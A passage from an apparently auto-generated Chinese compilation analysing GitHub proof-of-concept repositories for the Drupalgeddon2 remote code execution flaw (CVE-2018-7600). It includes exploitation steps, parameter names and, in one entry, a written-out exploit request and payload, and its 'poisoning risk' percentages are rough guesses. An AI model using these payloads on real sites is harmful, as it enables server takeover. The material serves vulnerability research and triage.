**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
